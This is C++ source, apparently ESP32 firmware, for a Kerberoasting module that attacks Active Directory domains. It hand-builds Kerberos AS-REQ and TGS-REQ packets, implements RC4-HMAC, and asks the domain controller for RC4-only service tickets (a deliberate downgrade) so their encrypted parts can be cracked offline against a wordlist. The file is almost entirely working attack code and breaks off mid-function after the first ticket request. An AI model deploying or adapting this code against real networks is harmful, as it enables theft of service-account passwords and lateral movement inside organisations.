#include "kerberoast.h"
#include <WiFiClient.h>
#include <SD.h>
#include <ArduinoJson.h>
#include <esp_random.h>
#include <time.h>
#include <vector>

#include <mbedtls/md.h>
#include "../common/ntcrypto.h"   // MD4 + RC4 (this build's mbedTLS has neither)
#include "krbcommon.h"

// MD4/RC4 are implemented in ntcrypto.h and HMAC-MD5 comes from mbedTLS, so
// the real implementation is always built.
#define KERBEROAST_CRYPTO_AVAILABLE 1

namespace {
    volatile bool g_running = false;
    volatile bool g_stopReq = false;
    IPAddress g_kdc;
    uint16_t g_port = 88;
    String g_realm, g_username, g_password, g_wordlist, g_error;
    volatile uint32_t g_done = 0;
    uint32_t g_total = 0;

    struct Found { String spn; int etype; String hash; };
    std::vector<Found> g_found;
    SemaphoreHandle_t g_mtx = nullptr;
    TaskHandle_t g_task = nullptr;

    // Scratch buffers for the (large) Kerberos messages. Heap-allocated on
    // first use and released when the command ends: as static arrays they
    // would reserve ~50KB of RAM permanently, even if kerberoast never runs.
    enum { SCR_SLOTS = 16 };
    uint8_t *g_scr[SCR_SLOTS] = {nullptr};
    uint8_t *scr(int slot, size_t n) {
        if (!g_scr[slot]) g_scr[slot] = (uint8_t *)malloc(n);
        return g_scr[slot];
    }
    void scrFree() { for (int i = 0; i < SCR_SLOTS; ++i) { free(g_scr[i]); g_scr[i] = nullptr; } }

    // ---- DER TLV writer (same pattern used throughout the AD modules) ----
    int derLen(uint8_t *out, int len) {
        if (len < 0x80) { out[0] = (uint8_t)len; return 1; }
        if (len < 0x100) { out[0] = 0x81; out[1] = (uint8_t)len; return 2; }
        out[0] = 0x82; out[1] = (uint8_t)(len >> 8); out[2] = (uint8_t)len; return 3;
    }
    int derTlv(uint8_t *out, uint8_t tag, const uint8_t *val, int vlen) {
        out[0] = tag;
        int lp = derLen(out + 1, vlen);
        if (vlen > 0) memcpy(out + 1 + lp, val, vlen);
        return 1 + lp + vlen;
    }
    int derExplicit(uint8_t *out, int n, const uint8_t *inner, int innerLen) {
        return derTlv(out, 0xA0 | n, inner, innerLen);
    }
    int derInt(uint8_t *out, int val) {
        uint8_t v = (uint8_t)val;
        return derTlv(out, 0x02, &v, 1);
    }
    int derGeneralString(uint8_t *out, const char *s) {
        return derTlv(out, 0x1B, (const uint8_t *)s, strlen(s));
    }
    int buildPrincipalName(uint8_t *out, int nameType, const char **parts, int nParts) {
        uint8_t typeTlv[8]; int tlen = derInt(typeTlv, nameType);
        uint8_t typeWrap[12]; int twlen = derExplicit(typeWrap, 0, typeTlv, tlen);

        uint8_t strs[256]; int sp = 0;
        for (int i = 0; i < nParts; ++i) sp += derGeneralString(strs + sp, parts[i]);
        uint8_t strsSeq[266]; int slen = derTlv(strsSeq, 0x30, strs, sp);
        uint8_t strsWrap[276]; int swlen = derExplicit(strsWrap, 1, strsSeq, slen);

        uint8_t body[300]; int bp = 0;
        memcpy(body + bp, typeWrap, twlen); bp += twlen;
        memcpy(body + bp, strsWrap, swlen); bp += swlen;
        return derTlv(out, 0x30, body, bp);
    }
    // EncryptedData ::= SEQUENCE { etype[0] INTEGER, cipher[2] OCTET STRING }
    int buildEncryptedData(uint8_t *out, int etype, const uint8_t *cipher, int cipherLen) {
        uint8_t etTlv[8]; int el = derInt(etTlv, etype);
        uint8_t etWrap[12]; int ewl = derExplicit(etWrap, 0, etTlv, el);
        uint8_t cTlv[600]; int cl = derTlv(cTlv, 0x04, cipher, cipherLen);
        uint8_t cWrap[610]; int cwl = derExplicit(cWrap, 2, cTlv, cl);
        uint8_t body[630]; int bp = 0;
        memcpy(body + bp, etWrap, ewl); bp += ewl;
        memcpy(body + bp, cWrap, cwl); bp += cwl;
        return derTlv(out, 0x30, body, bp);
    }
    // PA-DATA ::= SEQUENCE { padata-type[1] INTEGER, padata-value[2] OCTET STRING }
    int buildPaData(uint8_t *out, int paType, const uint8_t *val, int vlen) {
        uint8_t typeTlv[8]; int tl = derInt(typeTlv, paType);
        uint8_t typeWrap[12]; int twl = derExplicit(typeWrap, 1, typeTlv, tl);
        uint8_t valTlv[3700]; int vl = derTlv(valTlv, 0x04, val, vlen);
        uint8_t valWrap[3710]; int vwl = derExplicit(valWrap, 2, valTlv, vl);
        uint8_t body[3730]; int bp = 0;
        memcpy(body + bp, typeWrap, twl); bp += twl;
        memcpy(body + bp, valWrap, vwl); bp += vwl;
        return derTlv(out, 0x30, body, bp);
    }

    // ---- minimal DER reader (same pattern as Kerbrute) ----
    bool readTlvAt(const uint8_t *buf, int pos, int bufLen, uint8_t &tag, int &len, int &valOff, int &nextOff) {
        if (pos + 2 > bufLen) return false;
        tag = buf[pos];
        int lb = buf[pos + 1], lp;
        if (lb < 0x80) { len = lb; lp = 1; }
        else {
            int nb = lb & 0x7F;
            if (nb < 1 || nb > 2 || pos + 2 + nb > bufLen) return false;
            int l = 0; for (int i = 0; i < nb; ++i) l = (l << 8) | buf[pos + 2 + i];
            len = l; lp = 1 + nb;
        }
        valOff = pos + 1 + lp;
        nextOff = valOff + len;
        return nextOff <= bufLen;
    }
    // Finds the first immediate child of a SEQUENCE (spanning [seqVo,seqNo))
    // whose tag matches wantTag.
    bool findField(const uint8_t *msg, int seqVo, int seqNo, uint8_t wantTag, int &fVo, int &fNo) {
        int pos = seqVo;
        while (pos < seqNo) {
            uint8_t tag; int len, vo, no;
            if (!readTlvAt(msg, pos, seqNo, tag, len, vo, no)) break;
            if (tag == wantTag) { fVo = vo; fNo = no; return true; }
            pos = no;
        }
        return false;
    }

    String toHex(const uint8_t *buf, size_t len) {
        String s; s.reserve(len * 2);
        const char *hexd = "0123456789abcdef";
        for (size_t i = 0; i < len; ++i) { s += hexd[(buf[i] >> 4) & 0xF]; s += hexd[buf[i] & 0xF]; }
        return s;
    }

    bool sendFramed(WiFiClient &c, const uint8_t *buf, int len) {
        uint8_t hdr[4] = { 0, (uint8_t)(len >> 16), (uint8_t)(len >> 8), (uint8_t)len };
        c.write(hdr, 4);
        c.write(buf, len);
        return true;
    }
    bool g_oversize = false;   // set by recvFramed when a reply was bigger than the buffer
    bool recvFramed(WiFiClient &c, uint8_t *buf, int cap, int &outLen, uint32_t timeoutMs) {
        uint32_t deadline = millis() + timeoutMs;
        g_oversize = false;
        while (c.available() < 4) { if (millis() > deadline || !c.connected()) return false; delay(10); }
        uint8_t h[4]; c.read(h, 4);
        uint32_t len = ((uint32_t)h[1] << 16) | ((uint32_t)h[2] << 8) | h[3];
        if (len == 0) return false;
        if ((int)len > cap) { g_oversize = true; return false; }
        size_t got = 0;
        while (got < len) {
            if (millis() > deadline || !c.connected()) return false;
            if (c.available()) { int n = c.read(buf + got, len - got); if (n > 0) got += n; }
            else delay(5);
        }
        outLen = (int)len;
        return true;
    }

    int classifyKrbError(const uint8_t *msg, int len) {
        uint8_t tag; int l, vo, no;
        if (!readTlvAt(msg, 0, len, tag, l, vo, no) || tag != 0x7E) return -1;
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!readTlvAt(msg, vo, no, seqTag, seqLen, seqVo, seqNo)) return -1;
        int fVo, fNo;
        if (!findField(msg, seqVo, seqNo, 0xA6, fVo, fNo)) return -1; // error-code[6]
        uint8_t iTag; int iLen, iVo, iNo;
        if (!readTlvAt(msg, fVo, fNo, iTag, iLen, iVo, iNo) || iLen < 1) return -1;
        return iLen == 2 ? ((msg[iVo] << 8) | msg[iVo + 1]) : msg[iVo];
    }

    String krbErrText(int code) {
        switch (code) {
            case 6:  return "unknown user (KDC_ERR_C_PRINCIPAL_UNKNOWN)";
            case 14: return "no common encryption type: RC4 is disabled for this account (KDC_ERR_ETYPE_NOSUPP)";
            case 18: return "account disabled or locked out (KDC_ERR_CLIENT_REVOKED)";
            case 24: return "wrong password (KDC_ERR_PREAUTH_FAILED)";
            case 25: return "pre-authentication required but rejected (KDC_ERR_PREAUTH_REQUIRED)";
            case 37: return "clock skew too great (KRB_AP_ERR_SKEW): the device and DC clocks differ by more than 5 minutes";
            case 68: return "wrong realm (KDC_ERR_WRONG_REALM) - check the domain name";
            default: return "KRB-ERROR " + String(code);
        }
    }

#if KERBEROAST_CRYPTO_AVAILABLE
    // ---- RFC 4757 RC4-HMAC primitives ----
    void hmacMd5(const uint8_t *key, size_t keyLen, const uint8_t *msg, size_t msgLen, uint8_t out[16]) {
        const mbedtls_md_info_t *info = mbedtls_md_info_from_type(MBEDTLS_MD_MD5);
        mbedtls_md_hmac(info, key, keyLen, msg, msgLen, out);
    }
    void rc4(const uint8_t *key, size_t keyLen, const uint8_t *in, size_t len, uint8_t *out) {
        NtCrypto::rc4(key, keyLen, in, len, out);
    }
    // RFC 4757 section 3 maps Kerberos key usages onto the RC4-HMAC message
    // type: the AS-REP encrypted part (3) is keyed as 8, and 23 as 13.
    uint32_t rc4Usage(uint32_t usage) { return usage == 3 ? 8 : usage == 23 ? 13 : usage; }
    // K1 = MD4(UTF16LE(password))  -- RC4-HMAC string2key (RFC 4757 section 3)
    void deriveKey(const String &password, uint8_t key[16]) { NtCrypto::ntHash(password, key); }
    // Encrypt: Checksum(16) || RC4(K3, Confounder(8)||Plaintext)
    //   K2 = HMAC-MD5(K1, usage_LE32); Checksum = HMAC-MD5(K2, Confounder||PT); K3 = HMAC-MD5(K2, Checksum)
    void rc4HmacEncrypt(const uint8_t key[16], uint32_t usage, const uint8_t *plaintext, size_t ptLen,
                         uint8_t *out, size_t &outLen) {
        usage = rc4Usage(usage);
        uint8_t usageLe[4] = { (uint8_t)usage, (uint8_t)(usage >> 8), (uint8_t)(usage >> 16), (uint8_t)(usage >> 24) };
        uint8_t k2[16]; hmacMd5(key, 16, usageLe, 4, k2);

        uint8_t confounder[8];
        for (int i = 0; i < 8; ++i) confounder[i] = (uint8_t)esp_random();

        std::vector<uint8_t> confPt(8 + ptLen);
        memcpy(confPt.data(), confounder, 8);
        memcpy(confPt.data() + 8, plaintext, ptLen);

        uint8_t checksum[16]; hmacMd5(k2, 16, confPt.data(), confPt.size(), checksum);
        uint8_t k3[16]; hmacMd5(k2, 16, checksum, 16, k3);

        memcpy(out, checksum, 16);
        rc4(k3, 16, confPt.data(), confPt.size(), out + 16);
        outLen = 16 + confPt.size();
    }
    bool rc4HmacDecrypt(const uint8_t key[16], uint32_t usage, const uint8_t *cipher, size_t cipherLen,
                         std::vector<uint8_t> &plaintextOut) {
        if (cipherLen < 16 + 8) return false;
        usage = rc4Usage(usage);
        uint8_t usageLe[4] = { (uint8_t)usage, (uint8_t)(usage >> 8), (uint8_t)(usage >> 16), (uint8_t)(usage >> 24) };
        uint8_t k2[16]; hmacMd5(key, 16, usageLe, 4, k2);

        const uint8_t *checksum = cipher;
        const uint8_t *body = cipher + 16;
        size_t bodyLen = cipherLen - 16;

        uint8_t k3[16]; hmacMd5(k2, 16, checksum, 16, k3);

        std::vector<uint8_t> confPt(bodyLen);
        rc4(k3, 16, body, bodyLen, confPt.data());
        if (confPt.size() < 8) return false;
        // Integrity check: HMAC-MD5(K2, confounder||plaintext) must equal the
        // leading checksum - this is what tells a wrong password apart.
        uint8_t expect[16]; hmacMd5(k2, 16, confPt.data(), confPt.size(), expect);
        if (memcmp(expect, checksum, 16) != 0) return false;
        plaintextOut.assign(confPt.begin() + 8, confPt.end());
        return true;
    }

    // ---- higher-level Kerberos message builders ----

    int buildAsReqWithPreauth(uint8_t *out, int cap, const String &user, const String &realm,
                               const uint8_t key[16], time_t now) {
        // PA-ENC-TS-ENC ::= SEQUENCE { patimestamp[0] KerberosTime }
        struct tm tmv; gmtime_r(&now, &tmv);
        char ts[16]; strftime(ts, sizeof(ts), "%Y%m%d%H%M%SZ", &tmv);
        uint8_t tsTlv[20]; int tsl = derTlv(tsTlv, 0x18, (const uint8_t *)ts, strlen(ts));
        uint8_t tsWrap[24]; int tswl = derExplicit(tsWrap, 0, tsTlv, tsl);
        uint8_t paEncTsEnc[40]; int paEncTsLen = derTlv(paEncTsEnc, 0x30, tsWrap, tswl);

        uint8_t cipher[16 + 8 + 40]; size_t cipherLen;
        rc4HmacEncrypt(key, 1 /*PA-ENC-TIMESTAMP*/, paEncTsEnc, paEncTsLen, cipher, cipherLen);

        uint8_t encData[128]; int encDataLen = buildEncryptedData(encData, 23, cipher, cipherLen);
        uint8_t paData[180]; int paDataLen = buildPaData(paData, 2 /*PA-ENC-TIMESTAMP*/, encData, encDataLen);
        uint8_t paSeq[190]; int paSeqLen = derTlv(paSeq, 0x30, paData, paDataLen);
        uint8_t paWrap[200]; int paWrapLen = derExplicit(paWrap, 3, paSeq, paSeqLen);

        // req-body (kdc-options, cname, realm, sname=krbtgt/REALM, till, nonce, etype)
        uint8_t body[700]; int bp = 0;
        uint8_t kdcOpt[] = { 0, 0, 0, 0, 0 };
        uint8_t kdcOptTlv[8]; int kol = derTlv(kdcOptTlv, 0x03, kdcOpt, sizeof(kdcOpt));
        uint8_t kdcOptWrap[12]; int kowl = derExplicit(kdcOptWrap, 0, kdcOptTlv, kol);
        memcpy(body + bp, kdcOptWrap, kowl); bp += kowl;

        const char *cparts[1] = { user.c_str() };
        uint8_t cnameSeq[300]; int cnl = buildPrincipalName(cnameSeq, 1, cparts, 1);
        uint8_t cnameWrap[310]; int cnwl = derExplicit(cnameWrap, 1, cnameSeq, cnl);
        memcpy(body + bp, cnameWrap, cnwl); bp += cnwl;

        uint8_t realmTlv[200]; int rl = derGeneralString(realmTlv, realm.c_str());
        uint8_t realmWrap[210]; int rwl = derExplicit(realmWrap, 2, realmTlv, rl);
        memcpy(body + bp, realmWrap, rwl); bp += rwl;

        const char *sparts[2] = { "krbtgt", realm.c_str() };
        uint8_t snameSeq[300]; int snl = buildPrincipalName(snameSeq, 2, sparts, 2);
        uint8_t snameWrap[310]; int snwl = derExplicit(snameWrap, 3, snameSeq, snl);
        memcpy(body + bp, snameWrap, snwl); bp += snwl;

        const char *till = "20370913024805Z";
        uint8_t tillTlv[20]; int til = derTlv(tillTlv, 0x18, (const uint8_t *)till, strlen(till));
        uint8_t tillWrap[24]; int tiwl = derExplicit(tillWrap, 5, tillTlv, til);
        memcpy(body + bp, tillWrap, tiwl); bp += tiwl;

        uint32_t nonce = esp_random() & 0x7FFFFFFFu;
        uint8_t nb[4] = { (uint8_t)(nonce >> 24), (uint8_t)(nonce >> 16), (uint8_t)(nonce >> 8), (uint8_t)nonce };
        uint8_t nonceTlv[8]; int nl = derTlv(nonceTlv, 0x02, nb, 4);
        uint8_t nonceWrap[12]; int nwl = derExplicit(nonceWrap, 7, nonceTlv, nl);
        memcpy(body + bp, nonceWrap, nwl); bp += nwl;

        uint8_t et[16]; int ep = 0;
        int etypes[] = { 23, 17, 18 };
        for (int e : etypes) ep += derInt(et + ep, e);
        uint8_t etSeq[24]; int etl = derTlv(etSeq, 0x30, et, ep);
        uint8_t etWrap[28]; int etwl = derExplicit(etWrap, 8, etSeq, etl);
        memcpy(body + bp, etWrap, etwl); bp += etwl;

        uint8_t bodySeq[720]; int bsl = derTlv(bodySeq, 0x30, body, bp);
        uint8_t bodyWrap[730]; int bwl = derExplicit(bodyWrap, 4, bodySeq, bsl);

        uint8_t pvnoTlv[4]; int pvl = derInt(pvnoTlv, 5);
        uint8_t pvnoWrap[8]; int pvwl = derExplicit(pvnoWrap, 1, pvnoTlv, pvl);
        uint8_t mtTlv[4]; int mtl = derInt(mtTlv, 10);
        uint8_t mtWrap[8]; int mtwl = derExplicit(mtWrap, 2, mtTlv, mtl);

        uint8_t reqBuf[1000]; int reqP = 0;
        if (pvwl + mtwl + paWrapLen + bwl > (int)sizeof(reqBuf)) return -1;
        memcpy(reqBuf + reqP, pvnoWrap, pvwl); reqP += pvwl;
        memcpy(reqBuf + reqP, mtWrap, mtwl); reqP += mtwl;
        memcpy(reqBuf + reqP, paWrap, paWrapLen); reqP += paWrapLen;
        memcpy(reqBuf + reqP, bodyWrap, bwl); reqP += bwl;

        uint8_t reqSeq[1010]; int reqSeqLen = derTlv(reqSeq, 0x30, reqBuf, reqP);
        if (1 + 3 + reqSeqLen > cap) return -1;
        return derTlv(out, 0x6A, reqSeq, reqSeqLen); // AS-REQ = [APPLICATION 10]
    }

    int buildAuthenticator(uint8_t *out, int cap, const String &realm, const String &user, time_t now) {
        uint8_t vnoTlv[4]; int vl = derInt(vnoTlv, 5);
        uint8_t vnoWrap[8]; int vwl = derExplicit(vnoWrap, 0, vnoTlv, vl);

        uint8_t realmTlv[200]; int rl = derGeneralString(realmTlv, realm.c_str());
        uint8_t realmWrap[210]; int rwl = derExplicit(realmWrap, 1, realmTlv, rl);

        const char *cparts[1] = { user.c_str() };
        uint8_t cnameSeq[300]; int cnl = buildPrincipalName(cnameSeq, 1, cparts, 1);
        uint8_t cnameWrap[310]; int cnwl = derExplicit(cnameWrap, 2, cnameSeq, cnl);

        uint8_t cusecTlv[8]; int cul = derInt(cusecTlv, 0);
        uint8_t cusecWrap[12]; int cuwl = derExplicit(cusecWrap, 4, cusecTlv, cul);

        struct tm tmv; gmtime_r(&now, &tmv);
        char ts[16]; strftime(ts, sizeof(ts), "%Y%m%d%H%M%SZ", &tmv);
        uint8_t ctimeTlv[20]; int ctl = derTlv(ctimeTlv, 0x18, (const uint8_t *)ts, strlen(ts));
        uint8_t ctimeWrap[24]; int ctwl = derExplicit(ctimeWrap, 5, ctimeTlv, ctl);

        uint8_t body[800];
        if (vwl + rwl + cnwl + cuwl + ctwl > (int)sizeof(body)) return -1;
        int bp = 0;
        memcpy(body + bp, vnoWrap, vwl); bp += vwl;
        memcpy(body + bp, realmWrap, rwl); bp += rwl;
        memcpy(body + bp, cnameWrap, cnwl); bp += cnwl;
        memcpy(body + bp, cusecWrap, cuwl); bp += cuwl;
        memcpy(body + bp, ctimeWrap, ctwl); bp += ctwl;

        uint8_t seq[810]; int sl = derTlv(seq, 0x30, body, bp);
        if (1 + 3 + sl > cap) return -1;
        return derTlv(out, 0x62, seq, sl); // Authenticator = [APPLICATION 2]
    }

    int buildApReq(uint8_t *out, int cap, const uint8_t *ticketTlv, int ticketLen,
                   const uint8_t *encAuthenticator, int encAuthLen) {
        uint8_t pvnoTlv[4]; int pvl = derInt(pvnoTlv, 5);
        uint8_t pvnoWrap[8]; int pvwl = derExplicit(pvnoWrap, 0, pvnoTlv, pvl);
        uint8_t mtTlv[4]; int mtl = derInt(mtTlv, 14);
        uint8_t mtWrap[8]; int mtwl = derExplicit(mtWrap, 1, mtTlv, mtl);

        uint8_t apOpt[] = { 0, 0, 0, 0, 0 };
        uint8_t apOptTlv[8]; int aol = derTlv(apOptTlv, 0x03, apOpt, sizeof(apOpt));
        uint8_t apOptWrap[12]; int aowl = derExplicit(apOptWrap, 2, apOptTlv, aol);

        uint8_t *ticketWrap = scr(0, 3300);
        if (!ticketWrap || 3 + ticketLen > 3300) return -1; // ticket too large for this build
        int twl = derExplicit(ticketWrap, 3, ticketTlv, ticketLen);

        uint8_t encData[260]; int edl = buildEncryptedData(encData, 23, encAuthenticator, encAuthLen);
        uint8_t encWrap[270]; int ewl = derExplicit(encWrap, 4, encData, edl);

        uint8_t *body = scr(1, 3500);
        if (!body || pvwl + mtwl + aowl + twl + ewl > 3500) return -1;
        int bp = 0;
        memcpy(body + bp, pvnoWrap, pvwl); bp += pvwl;
        memcpy(body + bp, mtWrap, mtwl); bp += mtwl;
        memcpy(body + bp, apOptWrap, aowl); bp += aowl;
        memcpy(body + bp, ticketWrap, twl); bp += twl;
        memcpy(body + bp, encWrap, ewl); bp += ewl;

        uint8_t *seq = scr(2, 3510); if (!seq) return -1;
        int sl = derTlv(seq, 0x30, body, bp);
        if (1 + 3 + sl > cap) return -1;
        return derTlv(out, 0x6E, seq, sl); // AP-REQ = [APPLICATION 14]
    }

    int buildTgsReq(uint8_t *out, int cap, const String &realm, const String &spn,
                     const uint8_t *apReqBuf, int apReqLen, time_t now) {
        uint8_t *paData = scr(3, 3750), *paSeq = scr(4, 3760), *paWrap = scr(5, 3770);
        if (!paData || !paSeq || !paWrap) return -1;
        int paDataLen = buildPaData(paData, 1 /*PA-TGS-REQ*/, apReqBuf, apReqLen);
        int paSeqLen = derTlv(paSeq, 0x30, paData, paDataLen);
        int paWrapLen = derExplicit(paWrap, 3, paSeq, paSeqLen);

        uint8_t bodyBuf[700]; int bp = 0;
        uint8_t kdcOpt[] = { 0, 0, 0, 0, 0 };
        uint8_t kdcOptTlv[8]; int kol = derTlv(kdcOptTlv, 0x03, kdcOpt, sizeof(kdcOpt));
        uint8_t kdcOptWrap[12]; int kowl = derExplicit(kdcOptWrap, 0, kdcOptTlv, kol);
        memcpy(bodyBuf + bp, kdcOptWrap, kowl); bp += kowl;

        uint8_t realmTlv[200]; int rl = derGeneralString(realmTlv, realm.c_str());
        uint8_t realmWrap[210]; int rwl = derExplicit(realmWrap, 2, realmTlv, rl);
        memcpy(bodyBuf + bp, realmWrap, rwl); bp += rwl;

        int slash = spn.indexOf('/');
        String p1, p2; const char *parts[2]; int nParts, nameType;
        if (slash > 0) {
            p1 = spn.substring(0, slash); p2 = spn.substring(slash + 1);
            parts[0] = p1.c_str(); parts[1] = p2.c_str(); nParts = 2; nameType = 3;
        } else {
            p1 = spn; parts[0] = p1.c_str(); nParts = 1; nameType = 2;
        }
        uint8_t snameSeq[300]; int snl = buildPrincipalName(snameSeq, nameType, parts, nParts);
        uint8_t snameWrap[310]; int snwl = derExplicit(snameWrap, 3, snameSeq, snl);
        memcpy(bodyBuf + bp, snameWrap, snwl); bp += snwl;

        const char *till = "20370913024805Z";
        uint8_t tillTlv[20]; int til = derTlv(tillTlv, 0x18, (const uint8_t *)till, strlen(till));
        uint8_t tillWrap[24]; int tiwl = derExplicit(tillWrap, 5, tillTlv, til);
        memcpy(bodyBuf + bp, tillWrap, tiwl); bp += tiwl;

        uint32_t nonce = esp_random() & 0x7FFFFFFFu;
        uint8_t nb[4] = { (uint8_t)(nonce >> 24), (uint8_t)(nonce >> 16), (uint8_t)(nonce >> 8), (uint8_t)nonce };
        uint8_t nonceTlv[8]; int nl = derTlv(nonceTlv, 0x02, nb, 4);
        uint8_t nonceWrap[12]; int nwl = derExplicit(nonceWrap, 7, nonceTlv, nl);
        memcpy(bodyBuf + bp, nonceWrap, nwl); bp += nwl;

        uint8_t etTlv[8]; int etl = derInt(etTlv, 23); // RC4 only - classic kerberoast downgrade request
        uint8_t etSeq[12]; int etsl = derTlv(etSeq, 0x30, etTlv, etl);
        uint8_t etWrap[16]; int etwl = derExplicit(etWrap, 8, etSeq, etsl);
        memcpy(bodyBuf + bp, etWrap, etwl); bp += etwl;

        uint8_t bodySeq[720]; int bsl = derTlv(bodySeq, 0x30, bodyBuf, bp);
        uint8_t bodyWrap[730]; int bwl = derExplicit(bodyWrap, 4, bodySeq, bsl);

        uint8_t pvnoTlv[4]; int pvl = derInt(pvnoTlv, 5);
        uint8_t pvnoWrap[8]; int pvwl = derExplicit(pvnoWrap, 1, pvnoTlv, pvl);
        uint8_t mtTlv[4]; int mtl = derInt(mtTlv, 12);
        uint8_t mtWrap[8]; int mtwl = derExplicit(mtWrap, 2, mtTlv, mtl);

        uint8_t *reqBuf = scr(6, 4000); int reqP = 0;
        if (!reqBuf || pvwl + mtwl + paWrapLen + bwl > 4000) return -1;
        memcpy(reqBuf + reqP, pvnoWrap, pvwl); reqP += pvwl;
        memcpy(reqBuf + reqP, mtWrap, mtwl); reqP += mtwl;
        memcpy(reqBuf + reqP, paWrap, paWrapLen); reqP += paWrapLen;
        memcpy(reqBuf + reqP, bodyWrap, bwl); reqP += bwl;

        uint8_t *reqSeq = scr(7, 4010); if (!reqSeq) return -1;
        int reqSeqLen = derTlv(reqSeq, 0x30, reqBuf, reqP);
        if (1 + 3 + reqSeqLen > cap) return -1;
        return derTlv(out, 0x6C, reqSeq, reqSeqLen); // TGS-REQ = [APPLICATION 12]
    }

    bool parseAsRepForTgt(const uint8_t *msg, int len,
                          const uint8_t *&ticketTlv, int &ticketTlvLen,
                          int &encEtype, const uint8_t *&encCipher, int &encCipherLen) {
        uint8_t tag; int l, vo, no;
        if (!readTlvAt(msg, 0, len, tag, l, vo, no) || tag != 0x6B) return false; // AS-REP
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!readTlvAt(msg, vo, no, seqTag, seqLen, seqVo, seqNo)) return false;

        int tfVo, tfNo;
        if (!findField(msg, seqVo, seqNo, 0xA5, tfVo, tfNo)) return false; // ticket[5]
        ticketTlv = msg + tfVo; ticketTlvLen = tfNo - tfVo;

        int efVo, efNo;
        if (!findField(msg, seqVo, seqNo, 0xA6, efVo, efNo)) return false; // enc-part[6]
        uint8_t edTag; int edLen, edVo, edNo;
        if (!readTlvAt(msg, efVo, efNo, edTag, edLen, edVo, edNo)) return false;

        int etVo, etNo, cVo, cNo;
        if (!findField(msg, edVo, edNo, 0xA0, etVo, etNo)) return false;
        if (!findField(msg, edVo, edNo, 0xA2, cVo, cNo)) return false;
        uint8_t iTag; int iLen, iVo2, iNo2;
        if (!readTlvAt(msg, etVo, etNo, iTag, iLen, iVo2, iNo2) || iLen < 1) return false;
        encEtype = msg[iVo2];
        uint8_t oTag; int oLen, oVo2, oNo2;
        if (!readTlvAt(msg, cVo, cNo, oTag, oLen, oVo2, oNo2)) return false;
        encCipher = msg + oVo2; encCipherLen = oLen;
        return true;
    }

    bool extractSessionKey(const uint8_t *pt, int ptLen, uint8_t sessionKey[16]) {
        uint8_t tag; int l, vo, no;
        if (!readTlvAt(pt, 0, ptLen, tag, l, vo, no)) return false;
        if (tag != 0x79 && tag != 0x7A) return false; // EncASRepPart [25] / EncTGSRepPart [26]
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!readTlvAt(pt, vo, no, seqTag, seqLen, seqVo, seqNo)) return false;
        int kfVo, kfNo;
        if (!findField(pt, seqVo, seqNo, 0xA0, kfVo, kfNo)) return false; // key[0]
        uint8_t ksTag; int ksLen, ksVo, ksNo;
        if (!readTlvAt(pt, kfVo, kfNo, ksTag, ksLen, ksVo, ksNo)) return false;
        int kvVo, kvNo;
        if (!findField(pt, ksVo, ksNo, 0xA1, kvVo, kvNo)) return false; // keyvalue[1]
        uint8_t oTag; int oLen, oVo, oNo;
        if (!readTlvAt(pt, kvVo, kvNo, oTag, oLen, oVo, oNo)) return false;
        if (oLen > 16) return false;
        memcpy(sessionKey, pt + oVo, oLen);
        return true;
    }

    bool parseTgsRepServiceTicketEncPart(const uint8_t *msg, int len, int &etype,
                                         const uint8_t *&cipher, int &cipherLen) {
        uint8_t tag; int l, vo, no;
        if (!readTlvAt(msg, 0, len, tag, l, vo, no) || tag != 0x6D) return false; // TGS-REP
        uint8_t seqTag; int seqLen, seqVo, seqNo;
        if (!readTlvAt(msg, vo, no, seqTag, seqLen, seqVo, seqNo)) return false;

        int tfVo, tfNo;
        if (!findField(msg, seqVo, seqNo, 0xA5, tfVo, tfNo)) return false; // ticket[5]
        uint8_t tkTag; int tkLen, tkVo, tkNo;
        if (!readTlvAt(msg, tfVo, tfNo, tkTag, tkLen, tkVo, tkNo) || tkTag != 0x61) return false;
        uint8_t tkSeqTag; int tkSeqLen, tkSeqVo, tkSeqNo;
        if (!readTlvAt(msg, tkVo, tkNo, tkSeqTag, tkSeqLen, tkSeqVo, tkSeqNo)) return false;

        int efVo, efNo;
        if (!findField(msg, tkSeqVo, tkSeqNo, 0xA3, efVo, efNo)) return false; // ticket's own enc-part[3]
        uint8_t edTag; int edLen, edVo, edNo;
        if (!readTlvAt(msg, efVo, efNo, edTag, edLen, edVo, edNo)) return false;

        int etVo, etNo, cVo, cNo;
        if (!findField(msg, edVo, edNo, 0xA0, etVo, etNo)) return false;
        if (!findField(msg, edVo, edNo, 0xA2, cVo, cNo)) return false;
        uint8_t iTag; int iLen, iVo2, iNo2;
        if (!readTlvAt(msg, etVo, etNo, iTag, iLen, iVo2, iNo2) || iLen < 1) return false;
        etype = msg[iVo2];
        uint8_t oTag; int oLen, oVo2, oNo2;
        if (!readTlvAt(msg, cVo, cNo, oTag, oLen, oVo2, oNo2)) return false;
        cipher = msg + oVo2; cipherLen = oLen;
        return true;
    }
#endif // KERBEROAST_CRYPTO_AVAILABLE

    void runKerberoast() {
        // 1) best-effort NTP sync - Kerberos preauth needs a roughly correct clock
        configTime(0, 0, "pool.ntp.org", "time.google.com");
        time_t now = time(nullptr);
        uint32_t waitDeadline = millis() + 5000;
        while (now < 1700000000L && millis() < waitDeadline) { delay(200); now = time(nullptr); }
        if (now < 1700000000L) {
            g_error = "clock not synced (NTP failed) - Kerberos preauth needs accurate time";
            return;
        }

        uint8_t userKey[16];
        deriveKey(g_password, userKey);

        WiFiClient c;
        if (!c.connect(g_kdc, g_port, 4000)) {
            g_error = "AS-REQ: TCP connect failed";
            return;
        }

        uint8_t *asReqPkt = scr(8, 1100);
        int asReqLen = asReqPkt ? buildAsReqWithPreauth(asReqPkt, 1100, g_username, g_realm, userKey, now) : -1;
        if (asReqLen < 0 || !sendFramed(c, asReqPkt, asReqLen)) {
            g_error = "AS-REQ: build/send failed"; c.stop();
            return;
        }

        uint8_t *asResp = scr(9, 4096); int asRespLen = 0;
        if (!asResp || !recvFramed(c, asResp, 4096, asRespLen, 5000)) {
            g_error = g_oversize ? "AS-REP larger than this build's buffer (" + String(4096) + " bytes): the TGT's PAC is too big"
                                 : "AS-REQ: no response";
            c.stop();
            return;
        }
        c.stop();

        uint8_t tag0; int l0, vo0, no0;
        readTlvAt(asResp, 0, asRespLen, tag0, l0, vo0, no0);
        if (tag0 == 0x7E) {
            g_error = "AS-REQ failed: " + krbErrText(classifyKrbError(asResp, asRespLen));
            return;
        }

        const uint8_t *ticketTlv; int ticketTlvLen;
        int encEtype; const uint8_t *encCipher; int encCipherLen;
